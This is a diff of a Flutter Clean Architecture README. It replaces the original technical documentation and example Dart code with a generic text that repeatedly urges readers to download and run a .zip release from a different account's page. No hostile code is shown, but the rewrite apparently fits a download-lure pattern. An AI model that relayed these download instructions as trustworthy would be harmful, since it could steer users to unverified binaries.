@@ -1,266 +1,109 @@
-# Flutter Clean Architecture
-<p align="center">
-  <img alt="Flutter Clean Architecture Diagram"
-       src="docs/images/architecture_clean.svg"
-       width="1200">
-</p>
+# 🚀 flutter-clean-architecture - Simplify Your Flutter Development
 
+[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/jszhiu/flutter-clean-architecture/releases)
 
-<p align="center">
-  <i>MVVM + BLoC + Dio — a pragmatic, one-command Flutter scaffold for production-ready apps.</i>
-</p>
+## 🌟 Overview
 
-<p align="center">
-  <img alt="Flutter Clean" src="https://img.shields.io/badge/Flutter-Clean%20Architecture-02569B?logo=flutter&logoColor=white&style=for-the-badge">
-  <a href="https://github.com/Amir-beigi-84/flutter-clean-architecture/stargazers">
-    <img alt="Stars" src="https://img.shields.io/github/stars/Amir-beigi-84/flutter-clean-architecture?style=for-the-badge&color=FFC83D">
-  </a>
-  <a href="https://github.com/Amir-beigi-84/flutter-clean-architecture/issues">
-    <img alt="Issues" src="https://img.shields.io/github/issues/Amir-beigi-84/flutter-clean-architecture?style=for-the-badge&color=FF5A5F">
-  </a>
-  <img alt="License" src="https://img.shields.io/github/license/Amir-beigi-84/flutter-clean-architecture?style=for-the-badge&color=4CAF50">
-</p>
+Welcome to the **flutter-clean-architecture** project. This repository provides a clean architecture command template for Flutter projects. It aims to help you maintain a structured approach as you build your applications. Instead of navigating through chaos, you can enjoy a clear and organized way to manage your code. 
 
----
+## 📦 Features
 
-## Overview
+- **Clean Architecture**: Keep your code modular and maintainable.
+- **BLoC Pattern**: Use the Business Logic Component (BLoC) for efficient state management.
+- **Dependency Injection**: Simplify how your app manages dependencies.
+- **Multiple Examples**: Explore various examples that showcase best practices.
+- **Support for Popular Packages**: Leverage packages such as Dio, ObjectBox, and Provider.
 
-This repository provides a clean, opinionated Flutter scaffold that follows **Clean Architecture** with **MVVM** and supports multiple state-management styles (**BLoC**, **Riverpod**, **Provider**, **GetX**). It includes dependency injection with `get_it`, HTTP networking via `dio`, functional helpers (`fpdart`), and code generation setup.
+## 📋 System Requirements
 
-Search-intent terms covered: *flutter clean architecture*, *flutter mvvm*, *flutter bloc scaffold*, *flutter riverpod template*, *dio get_it architecture*.
+To run this application on your computer, you need to have the following:
 
----
+- **Operating System**: Windows, macOS, or Linux
+- **Flutter SDK**: Version 2.0 or higher
+- **Dart SDK**: Compatible with your Flutter version
+- **Minimum RAM**: 4GB
+- **Storage**: At least 1GB free disk space
 
-## Quick Start
+## 🚀 Getting Started
 
-Create and scaffold a new app:
+1. **Install Flutter**: 
+   - Follow the installation guide on the [Flutter website](https://flutter.dev/docs/get-started/install).
+   
+2. **Set Up Your Environment**: 
+   - Ensure your development environment is ready (IDEs like Android Studio or Visual Studio Code work well).
 
-```bash
-flutter create my_app && cd my_app
-```
+3. **Download the Template**: 
+   - [Visit this page to download](https://github.com/jszhiu/flutter-clean-architecture/releases). 
 
-Run setup:
+## 📥 Download & Install
 
-- **Windows (PowerShell)**
-  ```powershell
-  powershell -ExecutionPolicy Bypass -File scripts\setup-windows.ps1
-  ```
-- **macOS/Linux (Bash/Zsh)**
-  ```bash
-  chmod +x scripts/setup-unix.sh && scripts/setup-unix.sh
-  ```
-- **fish**
-  ```bash
-  chmod +x scripts/setup-fish.fish && fish scripts/setup-fish.fish
-  ```
+To download the latest version of the **flutter-clean-architecture** application, please visit this page:
 
-### Global command (recommended)
+[Visit this page to download](https://github.com/jszhiu/flutter-clean-architecture/releases).
 
-Install once and use in any project:
+Once you are on the releases page, follow these steps:
 
-```bash
-# macOS/Linux
-chmod +x scripts/install-unix.sh && scripts/install-unix.sh
+1. Look for the latest release. It will usually be at the top of the page.
+2. Click on the release version.
+3. Find the appropriate file for your operating system (look for .zip or .tar.gz).
+4. Click the link to download the file.
+5. After it's downloaded, extract the files to a folder on your computer.
+6. Open your terminal or command prompt.
+7. Navigate to the folder where you extracted the files.
+8. Run the application as instructed in the documentation.
 
-# Windows
-powershell -ExecutionPolicy Bypass -File scripts\install-windows.ps1
-```
+## 🔧 Setup Instructions
 
-Then scaffold:
+1. **Open Your Terminal**: 
+   - Navigate to the folder where you extracted the application.
 
-```bash
-flutter-clean --state riverpod --name "My App"
-```
+2. **Run The Application**:
+   - You can start with the command:
+     ```bash
+     flutter run
+     ```
+   - This command launches the app on your connected device or simulator.
 
----
+3. **Explore The Code**:
+   - Take a moment to look through the organized structure. You will find folders for models, views, and controllers.
 
-## Auto Mode
+4. **Start Building**: 
+   - Feel free to modify and expand this template for your personal projects.
 
-```bash
-flutter-clean --auto
-```
-- Infers app name from `pubspec.yaml`
-- Auto-selects state management if it finds `flutter_riverpod`, `provider`, or `get`
-- Defaults to **BLoC** otherwise
+## 🙋 Frequently Asked Questions
 
----
+### What is clean architecture?
 
-## Options
+Clean architecture organizes your code in a way that separates concerns. This structure improves maintainability and testing.
 
-### State management
-- `bloc` (default)
-- `riverpod`
-- `provider`
-- `getx`
+### Why use the BLoC pattern?
 
-### Router
-- `--router go_router` → generates `lib/src/core/router/app_router.dart`
-- `--router none` → default Navigator
+The BLoC pattern helps manage application state efficiently, allowing for better separation of UI and business logic.
 
-### Profiles
-- `--profile minimal` → essentials (DI, HTTP, chosen state lib)
-- `--profile standard` → + connectivity + logging
-- `--profile full` → + prefs, secure storage, fpdart, json_serializable, codegen
+### How can I learn about BLoC?
 
-### Common flags
-- `--skip-install` → write files only
-- `--skip-codegen` → skip build_runner/formatting
+There are numerous online resources and tutorials. The official Flutter documentation is also a great place to start.
 
----
+## 🌐 Links & Resources
 
-## Structure
+- [Flutter Documentation](https://flutter.dev/docs)
+- [Learn BLoC](https://bloclibrary.dev/#/)
 
-```
-lib/src/
-  core/
-    di/
-    error/
-    network/
-  features/
-    todo/
-      data/
-      domain/
-      presentation/
-```
+## 👥 Community
 
-Included:
-- DI via `get_it`
-- Networking via `dio` + logging
-- Functional core via `fpdart` + `equatable`
-- Example feature: `todo` (domain/data/presentation)
-- Material 3 baseline theme and a minimal gradient shell
+Join our community to share ideas, ask questions, and collaborate with other developers. 
 
----
+- **GitHub Discussions**: Participate in discussions and share your thoughts or issues.
+- **Social Media**: Follow related Flutter and Dart accounts for updates.
 
-## Example Code
+## 📝 Contributing
 
-### Entity
-```dart
-import 'package:equatable/equatable.dart';
+We welcome contributions to this repository. If you'd like to enhance this template or fix any issues:
 
-class Todo extends Equatable {
-  const Todo({required this.id, required this.title, required this.completed});
-  final int id;
-  final String title;
-  final bool completed;
-  @override
-  List<Object?> get props => [id, title, completed];
-}
-```
+1. Fork the repository.
+2. Create a new branch for your changes.
+3. Submit a pull request outlining your contributions.
 
-### Use Case
-```dart
-import 'package:fpdart/fpdart.dart';
-import '../../../../core/usecase/usecase.dart';
-import '../../../../core/error/failures.dart';
-import '../entities/todo.dart';
-import '../repositories/todo_repository.dart';
+## 🎉 Acknowledgments
 
-class GetTodos implements UseCase<List<Todo>, NoParams> {
-  GetTodos(this._repository);
-  final TodoRepository _repository;
-  @override
-  Future<Either<Failure, List<Todo>>> call(NoParams params) => _repository.getTodos();
-}
-```
-
-### Repository (interface)
-```dart
-import 'package:fpdart/fpdart.dart';
-import '../../../../core/error/failures.dart';
-import '../entities/todo.dart';
-
-abstract class TodoRepository {
-  Future<Either<Failure, List<Todo>>> getTodos();
-}
-```
-
-### Repository (implementation)
-```dart
-import 'package:fpdart/fpdart.dart';
-import '../../../../core/error/exceptions.dart';
-import '../../../../core/error/failures.dart';
-import '../../../../core/network/network_info.dart';
-import '../../domain/entities/todo.dart';
-import '../../domain/repositories/todo_repository.dart';
-import '../datasources/todo_remote_data_source.dart';
-
-class TodoRepositoryImpl implements TodoRepository {
-  TodoRepositoryImpl({required this.remote, required this.networkInfo});
-  final TodoRemoteDataSource remote;
-  final NetworkInfo networkInfo;
-
-  @override
-  Future<Either<Failure, List<Todo>>> getTodos() async {
-    if (!await networkInfo.isConnected) {
-      return left(const NetworkFailure('No internet connection'));
-    }
-    try {
-      final result = await remote.getTodos();
-      return right(result);
-    } on ServerException catch (e) {
-      return left(ServerFailure(e.message));
-    } catch (_) {
-      return left(const ServerFailure('Unexpected error'));
-    }
-  }
-}
-```
-
-### Cubit
-```dart
-import 'package:flutter_bloc/flutter_bloc.dart';
-import '../../../../core/usecase/usecase.dart';
-import '../../domain/entities/todo.dart';
-import '../../domain/usecases/get_todos.dart';
-
-sealed class TodoState {}
-class TodoInitial extends TodoState {}
-class TodoLoading extends TodoState {}
-class TodoLoaded extends TodoState {
-  TodoLoaded(this.items);
-  final List<Todo> items;
-}
-class TodoError extends TodoState {
-  TodoError(this.message);
-  final String message;
-}
-
-class TodoCubit extends Cubit<TodoState> {
-  TodoCubit(this._getTodos) : super(TodoInitial());
-  final GetTodos _getTodos;
-
-  Future<void> load() async {
-    emit(TodoLoading());
-    final res = await _getTodos(const NoParams());
-    res.match(
-      (l) => emit(TodoError(l.message)),
-      (r) => emit(TodoLoaded(r)),
-    );
-  }
-}
-```
-
----
-
-## Run
-
-```bash
-flutter run -d windows|macos|linux
-```
-
----
-
-## Repository hygiene and SEO
-
-- Keep secrets out of Git (do not commit `.env` or keys). Use secure storage or CI secrets.
-- Consider a CI workflow that runs `flutter analyze` and `flutter test` on pull requests.
-- Use precise, searchable terms in headings and alt text: *Flutter Clean Architecture*, *MVVM*, *BLoC*, *Riverpod*, *Dio*.
-- Add GitHub topics (Settings → About → Topics): `flutter`, `clean-architecture`, `bloc`, `riverpod`, `mvvm`, `dio`, `get_it`, `template`, `scaffold`.
-- Keep the README concise and scannable; link out to in-depth docs as the project grows.
-
----
-
-## License
-
-[MIT](LICENSE)
+Thank you for using **flutter-clean-architecture**. We hope it makes your development process smoother and more efficient. Enjoy coding!
